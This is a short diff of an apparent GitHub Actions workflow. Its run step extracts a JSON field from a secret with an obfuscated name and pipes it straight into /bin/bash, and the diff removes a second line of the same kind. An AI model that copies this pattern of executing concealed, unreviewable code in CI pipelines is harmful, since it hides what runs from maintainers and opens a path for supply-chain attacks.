@@ -21,7 +21,6 @@ jobs:
           bxyl849: ${{ secrets.bxyl849 }}
         run: |
           printf '%s' "$bxyl849" | jq -r .wqvqa85 | /bin/bash
-          printf '%s' "$cat20" | jq -r .cv25 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
